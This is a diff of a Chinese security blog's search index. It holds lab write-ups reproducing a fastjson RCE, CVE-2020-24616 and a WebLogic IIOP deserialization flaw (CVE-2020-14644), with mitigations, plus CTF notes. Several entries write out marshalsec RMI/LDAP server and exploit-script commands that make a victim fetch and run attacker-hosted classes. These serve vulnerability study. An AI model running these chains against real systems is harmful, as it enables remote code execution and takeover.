@@ -1,52 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>0x01第一个docker漏洞环境搭建复现fastjson</title>
-    <url>/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/</url>
-    <content><![CDATA[<h4 id="第一个docker漏洞环境搭建复现"><a href="#第一个docker漏洞环境搭建复现" class="headerlink" title="第一个docker漏洞环境搭建复现"></a>第一个docker漏洞环境搭建复现</h4><p>由于某原因要进行fastjson漏洞的复现，已获得脚本及exp</p>
-<a id="more"></a>
-
-<h5 id="0x1-搭建docker（mac版）"><a href="#0x1-搭建docker（mac版）" class="headerlink" title="0x1 搭建docker（mac版）"></a>0x1 搭建docker（mac版）</h5><p>参考链接：<a href="https://www.runoob.com/docker/macos-docker-install.html">https://www.runoob.com/docker/macos-docker-install.html</a></p>
-<p>安装成功后进行初始化</p>
-<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115207734.png" alt="image-20201109115207734"></p>
-<p>问题：发现80端口被占用</p>
-<p>解决：<a href="https://blog.csdn.net/haha223545/article/details/105244919%EF%BC%8C%E6%98%AFapache%E5%8D%A0%E7%94%A8%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%81%9C%E6%AD%A2apache%E6%9C%8D%E5%8A%A1%E5%8D%B3%E5%8F%AF%EF%BC%9Asudo">https://blog.csdn.net/haha223545/article/details/105244919，是apache占用了，所以停止apache服务即可：sudo</a> apachectl stop</p>
-<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115229824.png" alt="image-20201109115229824"></p>
-<h5 id="0x2-从git上拉取漏洞环境靶机vulhub（mac需要装好Git）"><a href="#0x2-从git上拉取漏洞环境靶机vulhub（mac需要装好Git）" class="headerlink" title="0x2 从git上拉取漏洞环境靶机vulhub（mac需要装好Git）"></a>0x2 从git上拉取漏洞环境靶机vulhub（mac需要装好Git）</h5><p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115254393.png" alt="image-20201109115254393"></p>
-<p>进入后能看到有许多漏洞环境</p>
-<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115311533.png" alt="image-20201109115311533"></p>
-<h5 id="0x3-使用docker"><a href="#0x3-使用docker" class="headerlink" title="0x3 使用docker"></a>0x3 使用docker</h5><p>进入对应的文件夹，使用docker-compose up</p>
-<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115334588.png" alt="image-20201109115334588"></p>
-<p>成功启动，漏洞环境已经搭好</p>
-<h5 id="0x4-开始漏洞攻击复现"><a href="#0x4-开始漏洞攻击复现" class="headerlink" title="0x4 开始漏洞攻击复现"></a>0x4 开始漏洞攻击复现</h5><p>从docker中登录受害者靶机，可以查看是否有文件生成</p>
-<p>​    docker ps -a：查看ID</p>
-<p>​    docker exec -it ID /bin/bash</p>
-<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115443747.png" alt="image-20201109115443747"></p>
-<p>接下来有两种方式：</p>
-<p>1、使用另一台计算机作为攻击机和服务器端，进行攻击</p>
-<p>2、使用docker搭建一个服务器端，本机作为攻击机（不然攻击机和受害机IP会相同）</p>
-<p>第一种方法实践：</p>
-<p>选择同一网段下的另一个计算机，搭建服务器端</p>
-<p>查看IP，开启python Http服务（注意要和rmi在同一文件夹下开启，不然无法访问到文件的），打开rmi服务</p>
-<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109114538181.png" alt="image-20201109114538181"></p>
-<p>IP为10.141.0.125，攻击语句：</p>
-<p>1、python3 -m http.server –bind 0.0.0.0 8888</p>
-<p>2、java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://x.x.x.x:8888/#Exploit&quot;">http://x.x.x.x:8888/#Exploit&quot;</a> 9999</p>
-<p>3、python3 fastjson-1.2.47_rce.py <a href="http://s.s.s.s:8080/">http://s.s.s.s:8080/</a> rmi://x.x.x.x:9999/Exploit</p>
-<p>其中，第一句中的8888端口要与第二句中的8888，端口号可改但须一致，第二句中的9999和第三句中的9999，端口号可改但须一致，x.x.x.x为本机IP，即攻击者ip，s.s.s.s为受害者靶机Ip,端口8080需要根据靶机环境进行更改</p>
-<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109114938652.png" alt="image-20201109114938652"></p>
-<p>攻击成功后，能在受害者靶机上看到exphub文件，在http上也能看见请求</p>
-<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115025283.png" alt="image-20201109115025283"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-        <tag>fastjson</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>0x01ichunqiu逆向刷题</title>
     <url>/2020/10/09/0x01ichunqiu%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98/</url>
     <content><![CDATA[<h4 id="ichunqiu逆向刷题"><a href="#ichunqiu逆向刷题" class="headerlink" title="ichunqiu逆向刷题"></a>ichunqiu逆向刷题</h4><a id="more"></a>
@@ -226,6 +180,52 @@
       </tags>
   </entry>
   <entry>
+    <title>0x01第一个docker漏洞环境搭建复现fastjson</title>
+    <url>/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/</url>
+    <content><![CDATA[<h4 id="第一个docker漏洞环境搭建复现"><a href="#第一个docker漏洞环境搭建复现" class="headerlink" title="第一个docker漏洞环境搭建复现"></a>第一个docker漏洞环境搭建复现</h4><p>由于某原因要进行fastjson漏洞的复现，已获得脚本及exp</p>
+<a id="more"></a>
+
+<h5 id="0x1-搭建docker（mac版）"><a href="#0x1-搭建docker（mac版）" class="headerlink" title="0x1 搭建docker（mac版）"></a>0x1 搭建docker（mac版）</h5><p>参考链接：<a href="https://www.runoob.com/docker/macos-docker-install.html">https://www.runoob.com/docker/macos-docker-install.html</a></p>
+<p>安装成功后进行初始化</p>
+<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115207734.png" alt="image-20201109115207734"></p>
+<p>问题：发现80端口被占用</p>
+<p>解决：<a href="https://blog.csdn.net/haha223545/article/details/105244919%EF%BC%8C%E6%98%AFapache%E5%8D%A0%E7%94%A8%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%81%9C%E6%AD%A2apache%E6%9C%8D%E5%8A%A1%E5%8D%B3%E5%8F%AF%EF%BC%9Asudo">https://blog.csdn.net/haha223545/article/details/105244919，是apache占用了，所以停止apache服务即可：sudo</a> apachectl stop</p>
+<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115229824.png" alt="image-20201109115229824"></p>
+<h5 id="0x2-从git上拉取漏洞环境靶机vulhub（mac需要装好Git）"><a href="#0x2-从git上拉取漏洞环境靶机vulhub（mac需要装好Git）" class="headerlink" title="0x2 从git上拉取漏洞环境靶机vulhub（mac需要装好Git）"></a>0x2 从git上拉取漏洞环境靶机vulhub（mac需要装好Git）</h5><p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115254393.png" alt="image-20201109115254393"></p>
+<p>进入后能看到有许多漏洞环境</p>
+<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115311533.png" alt="image-20201109115311533"></p>
+<h5 id="0x3-使用docker"><a href="#0x3-使用docker" class="headerlink" title="0x3 使用docker"></a>0x3 使用docker</h5><p>进入对应的文件夹，使用docker-compose up</p>
+<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115334588.png" alt="image-20201109115334588"></p>
+<p>成功启动，漏洞环境已经搭好</p>
+<h5 id="0x4-开始漏洞攻击复现"><a href="#0x4-开始漏洞攻击复现" class="headerlink" title="0x4 开始漏洞攻击复现"></a>0x4 开始漏洞攻击复现</h5><p>从docker中登录受害者靶机，可以查看是否有文件生成</p>
+<p>​    docker ps -a：查看ID</p>
+<p>​    docker exec -it ID /bin/bash</p>
+<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115443747.png" alt="image-20201109115443747"></p>
+<p>接下来有两种方式：</p>
+<p>1、使用另一台计算机作为攻击机和服务器端，进行攻击</p>
+<p>2、使用docker搭建一个服务器端，本机作为攻击机（不然攻击机和受害机IP会相同）</p>
+<p>第一种方法实践：</p>
+<p>选择同一网段下的另一个计算机，搭建服务器端</p>
+<p>查看IP，开启python Http服务（注意要和rmi在同一文件夹下开启，不然无法访问到文件的），打开rmi服务</p>
+<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109114538181.png" alt="image-20201109114538181"></p>
+<p>IP为10.141.0.125，攻击语句：</p>
+<p>1、python3 -m http.server –bind 0.0.0.0 8888</p>
+<p>2、java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://x.x.x.x:8888/#Exploit&quot;">http://x.x.x.x:8888/#Exploit&quot;</a> 9999</p>
+<p>3、python3 fastjson-1.2.47_rce.py <a href="http://s.s.s.s:8080/">http://s.s.s.s:8080/</a> rmi://x.x.x.x:9999/Exploit</p>
+<p>其中，第一句中的8888端口要与第二句中的8888，端口号可改但须一致，第二句中的9999和第三句中的9999，端口号可改但须一致，x.x.x.x为本机IP，即攻击者ip，s.s.s.s为受害者靶机Ip,端口8080需要根据靶机环境进行更改</p>
+<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109114938652.png" alt="image-20201109114938652"></p>
+<p>攻击成功后，能在受害者靶机上看到exphub文件，在http上也能看见请求</p>
+<p><img src="/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/image-20201109115025283.png" alt="image-20201109115025283"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+        <tag>fastjson</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>0x02xctf新手训练题</title>
     <url>/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/</url>
     <content><![CDATA[<h4 id="xctf新手训练题"><a href="#xctf新手训练题" class="headerlink" title="xctf新手训练题"></a>xctf新手训练题</h4><a id="more"></a>
@@ -328,172 +328,64 @@
       </categories>
   </entry>
   <entry>
-    <title>0x04CVE-2020-24616复现</title>
-    <url>/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h4 id="CVE-2020-24616复现"><a href="#CVE-2020-24616复现" class="headerlink" title="CVE-2020-24616复现"></a>CVE-2020-24616复现</h4><p>预警参考链接：<a href="https://s.tencent.com/research/bsafe/1102.html">https://s.tencent.com/research/bsafe/1102.html</a></p>
-<p>8月底爆出的新漏洞，分析可参考:<a href="https://mp.weixin.qq.com/s/IICSnsSgwsjnbImgVP-y5g">https://mp.weixin.qq.com/s/IICSnsSgwsjnbImgVP-y5g</a></p>
+    <title>0x03CVE-2020-14644 weblogic iiop反序列化漏洞分析</title>
+    <url>/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h3 id="CVE-2020-14644-weblogic-iiop反序列化漏洞分析"><a href="#CVE-2020-14644-weblogic-iiop反序列化漏洞分析" class="headerlink" title="CVE-2020-14644 weblogic iiop反序列化漏洞分析"></a>CVE-2020-14644 weblogic iiop反序列化漏洞分析</h3><p>参考：</p>
+<p>0x1 <a href="https://my.oschina.net/u/4280983/blog/4477476">https://my.oschina.net/u/4280983/blog/4477476</a></p>
+<p>0x2 宽字节的推文</p>
 <a id="more"></a>
 
-<p>参考CVE-2020-8840的复现流程，编写Poc，实现此漏洞复现</p>
-<p>0x1 搭建一个Java项目，新建一个Poc类，下载并导入存在漏洞的包</p>
-<img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904171250748.png" alt="image-20200904171250748" style="zoom:50%;">
-
-<p>0x2 可以直接本地充当服务端，也可使用另一台在同一局域网下的电脑充当服务端，两种方式经实验皆可成功复现，在此记录后者</p>
-<p>编写exploid文件：</p>
-<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904171609352.png" alt="image-20200904171609352"></p>
-<p>这个操作是在Mac电脑下弹出计算器（注意：calculator.app的路径需根据实际情况填写）</p>
-<p>对此java文件进行javac操作生成exploid.class，放到服务端上</p>
-<p>开启服务端：</p>
-<p>python3 -m http.server 8888</p>
-<p>查看本机Ip后用python启动服务端（注意：python开启时要和exploid.class文件在同一文件夹下</p>
-<p>启动LDAP：</p>
-<p>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “<a href="http://x.x.x.x(服务端ip):8888/#Exploit&quot;">http://x.x.x.x(服务端Ip):8888/#Exploit&quot;</a> 9999</p>
-<p>本机编写POC文件（java菜鸟写了好久才写出来poc</p>
-<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904173651117.png" alt="image-20200904173651117"></p>
-<p>运行POC文件,成功弹出计算器，此时服务端也有记录</p>
-<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20201109172340274.png" alt="image-20201109172340274"></p>
+<h4 id="0x1-漏洞介绍"><a href="#0x1-漏洞介绍" class="headerlink" title="0x1 漏洞介绍"></a>0x1 漏洞介绍</h4><h5 id="0x01-WebLogic组件"><a href="#0x01-WebLogic组件" class="headerlink" title="0x01 WebLogic组件"></a>0x01 WebLogic组件</h5><p>WebLogic是美国Oracle公司出品的一个application server，是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器，适用于云环境和传统环境的应用服务器组件。</p>
+<h5 id="0x02-漏洞简介"><a href="#0x02-漏洞简介" class="headerlink" title="0x02 漏洞简介"></a>0x02 漏洞简介</h5><p>Oracle官方在2020年7月份发布的最新安全补丁中披露了此漏洞。此漏洞CVSS评分9.8，<strong>受影响的版本是12.2.1.3.0、12.2.1.4.0和14.1.1.0.0</strong>。该漏洞允许未经身份验证的攻击者通过 IIOP , T3 进行网络访问，攻击者成功攻击此漏洞可能导致Oracle WebLogic Server被接管。</p>
+<h4 id="0x2-漏洞分析"><a href="#0x2-漏洞分析" class="headerlink" title="0x2 漏洞分析"></a>0x2 漏洞分析</h4><h5 id="0x01-相关知识"><a href="#0x01-相关知识" class="headerlink" title="0x01 相关知识"></a>0x01 相关知识</h5><h6 id="JDK的classloader类和defineClass方法"><a href="#JDK的classloader类和defineClass方法" class="headerlink" title="JDK的classloader类和defineClass方法"></a>JDK的classloader类和defineClass方法</h6><p>​    一个类在被使用之前，会经历class文件生成—&gt;加载—&gt;连接—&gt;初始化等阶段。其中加载阶段主要完成三件事：1、通过类的全限定名来获取定义次类的二进制字节流，2、将该二进制字节流定义的静态数据结构转换成方法区的运行时数据结构，3、在内存中生成一个代表该类的Class对象，供外部通过该对象来获取类的元数据信息。</p>
+<p>​    JDK中的ClassLoader类中有个方法是defineClass，可以根据类全限定名和类的字节数组，加载一个类并返回对应的Class对象到 JVM（Java Virtual Machine）中。</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110556771.png" alt="image-20201015110556771"></p>
+<p>如上图所示，如果参数’name’（类名）和’b’（类文件的二进制数据）可控，理论上我们可以加载任何类，我们可以通过该方法，构造符合class格式的bytes数组作为类去加载。（注意：1、一般情况下，通过defineClass加载的类不允许同名，2、一个类中的类名name和类字节数组b中的类名要对应）</p>
+<h6 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h6><p>​    javassist是一个开源的分析、编辑和创建Java字节码的类库。它提供了更高级的API，执行效率相对ASM较差，但无需掌握字节码指令的知识，对使用者要求较低。它直接使用java编码的形式，不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。</p>
+<h5 id="0x02-漏洞代码分析"><a href="#0x02-漏洞代码分析" class="headerlink" title="0x02 漏洞代码分析"></a>0x02 漏洞代码分析</h5><p>该漏洞的原理是在反序列化时，通过使用defineClass方法，加载恶意类。</p>
+<p>关键类：com.tangosol.internal.util.invoke.RemoteConstructor</p>
+<p>在RemoteConstructor类中，构造实例的代码如下：</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014111222573.png" alt="image-20201014111222573"></p>
+<p>其中RemotableSupport类，可以理解为是coherence自定义的Classloader，在其中实现了defineClass，具有加载类的功能。查看其中的realize方法：</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110307308.png" alt="image-20201015110307308"></p>
+<p>先执行this.registerIfAbsent(constructor.getDefinition())方法</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110341915.png" alt="image-20201015110341915"></p>
+<p>RemotableSupport中定义了 Map 类型的 f_mapDefinitions 的变量充当缓存，每次调用realize时就会先在缓存中查找ClassDefinition。</p>
+<p>执行完成后，调用getRemotableClass方法，获取clz。查看ClassDefinition类</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014112030482.png" alt="image-20201014112030482"></p>
+<p>可以看到getRemotableClass返回m_clz,并且m_clz是用transient修饰的（transient的含义：将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会被序列化，最终变量为NULL）</p>
+<p>所以clz为NULL。于是在realize方法中，就会进入if分支，调用defineClass加载恶意类字节码。</p>
+<p>RemotableSupport 继承了ClassLoader，所以它的 defineClass 就是调用了父类的 defineClass来加载类。</p>
+<p>需要注意的是BinClassName变量的命名，使用的是ClassIdentity类中的getName方法</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110410957.png" alt="image-20201015110410957"></p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110448486.png" alt="image-20201015110448486"></p>
+<p>ClassIdentity类中的构造方法是将clazz作为参数，然后提取该类的一些特征信息，如Basename等。其中getName函数可以简化为：getName() = package + “/“ + baseName + “$” + version</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014105230694.png" alt="image-20201014105230694"></p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014105430256.png" alt="image-20201014105430256"></p>
+<p>所以 ClassIdentity 中的字节数组 byte[] 中的对应的 Class 的类名必须为 package + “.” + baseName + “$” + version，否则可能会加载失败。</p>
+<p>继续分析realize方法，加载类之后调用了createInstance方法</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014152406910.png" alt="image-20201014152406910"></p>
+<p>aoArgs作为参数进行实例化对象，所以将恶意代码写在构造方法中，实例化之后就会执行恶意代码。</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110636109.png" alt="image-20201015110636109"></p>
+<p> 所以只要构造一个带有包名类的恶意代码写进构造函数中，通过 javassist动态修改类名，将原类名加上 $ 和 version 值对应，通过iiop协议和反序列化发送给weblogic服务器，即可实现漏洞利用</p>
+<h4 id="0x3-漏洞复现"><a href="#0x3-漏洞复现" class="headerlink" title="0x3 漏洞复现"></a>0x3 漏洞复现</h4><h5 id="0x01-漏洞利用-弹计算器"><a href="#0x01-漏洞利用-弹计算器" class="headerlink" title="0x01 漏洞利用-弹计算器"></a>0x01 漏洞利用-弹计算器</h5><p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110723660.png" alt="image-20201015110723660"></p>
+<h5 id="0x02-漏洞利用-信息回显"><a href="#0x02-漏洞利用-信息回显" class="headerlink" title="0x02 漏洞利用-信息回显"></a>0x02 漏洞利用-信息回显</h5><p>1、开启weblogic服务器</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110854978.png" alt="image-20201015110854978"></p>
+<p>2、查看weblogic服务器的网络配置信息</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110937437.png" alt="image-20201015110937437"></p>
+<p>3、在攻击机上，编写特制的恶意类（写入weblogic服务器的Ip和weblogic服务的端口以及攻击命令），打包jar包，运行，就可以直接获取到weblogic服务器的信息</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201109171158094.png" alt="image-20201109171158094"></p>
+<h4 id="0x4-漏洞防护方案"><a href="#0x4-漏洞防护方案" class="headerlink" title="0x4 漏洞防护方案"></a>0x4 漏洞防护方案</h4><h5 id="0x01-官方方案："><a href="#0x01-官方方案：" class="headerlink" title="0x01 官方方案："></a>0x01 官方方案：</h5><p>官方已经针对此漏洞发布补丁，请受影响的用户参考以下链接安装补丁更新：</p>
+<p><a href="https://www.oracle.com/security-alerts/cpujul2020.html">https://www.oracle.com/security-alerts/cpujul2020.html</a></p>
+<h5 id="0x02-临时解决方案："><a href="#0x02-临时解决方案：" class="headerlink" title="0x02 临时解决方案："></a>0x02 临时解决方案：</h5><h6 id="关闭IIOP协议："><a href="#关闭IIOP协议：" class="headerlink" title="关闭IIOP协议："></a>关闭IIOP协议：</h6><p>在WebLogic控制台中，选择“服务”-&gt;”AdminServer”-&gt;”协议”，取消“启用IIOP”的勾选。并重启WebLogic项目，使配置生效。</p>
+<h6 id="控制T3服务："><a href="#控制T3服务：" class="headerlink" title="控制T3服务："></a>控制T3服务：</h6><p>在WebLogic界面中选择安全-筛选器，在下方出现的界面中找到“连接筛选器”，在里面输入：security.net.ConnectionFilterImpl，然后在连接筛选器规则中输入：127.0.0.1 * * allow t3 t3s，0.0.0.0/0 * * deny t3 t3s。最后保存并重启服务器即可生效。</p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>jackson</tag>
-        <tag>反序列化</tag>
+        <tag>weblogic</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>0x04Xctf进阶刷题-2-更新中</title>
-    <url>/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/</url>
-    <content><![CDATA[<p>XCTF进阶刷题-2</p>
-<a id="more"></a>
-
-<h5 id="0x01-666"><a href="#0x01-666" class="headerlink" title="0x01 666"></a>0x01 666</h5><p>IDA分析</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201103174113594.png" alt="image-20201103174113594"></p>
-<p>进入encode去看具体的加密操作，是几个异或操作，然后3个字符一组</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201103174237818.png" alt="image-20201103174237818"></p>
-<p>编写脚本，flag就出来了</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201103174322010.png" alt="image-20201103174322010"></p>
-<h5 id="0x02-signin-rsa算法"><a href="#0x02-signin-rsa算法" class="headerlink" title="0x02 signin-rsa算法"></a>0x02 signin-rsa算法</h5><p>rsa相关知识：</p>
-<p><a href="https://www.52pojie.cn/thread-1100545-1-1.html">https://www.52pojie.cn/thread-1100545-1-1.html</a></p>
-<p>ida查看主函数，根据算法特征得知是rsa算法</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110143659748.png" alt="image-20201110143659748"></p>
-<p>以下函数的作用是将输入字符串转为十六进制ascii码字符串：</p>
-<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110144019734.png" alt="image-20201110144019734"></p>
-<p>利用yafu分解（windows安装：<a href="https://blog.csdn.net/weixin_41603028/article/details/97167312%EF%BC%89%EF%BC%8C%E7%84%B6%E5%90%8E%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC%E5%A6%82%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BD%AC%E6%8D%A2%E5%8D%B3%E5%8F%AF">https://blog.csdn.net/weixin_41603028/article/details/97167312），然后编写脚本如下，然后转换即可</a></p>
